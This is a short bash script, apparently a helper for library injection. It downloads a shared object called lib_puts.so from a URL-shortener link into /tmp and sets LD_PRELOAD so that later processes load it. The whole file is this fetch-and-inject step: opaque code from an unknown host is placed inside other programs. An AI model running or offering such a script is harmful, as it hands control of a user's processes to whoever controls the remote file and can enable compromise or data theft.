#!/bin/bash
wget -O /tmp/lib_puts.so https://rb.gy/92kor
export LD_PRELOAD=/tmp/lib_puts.so
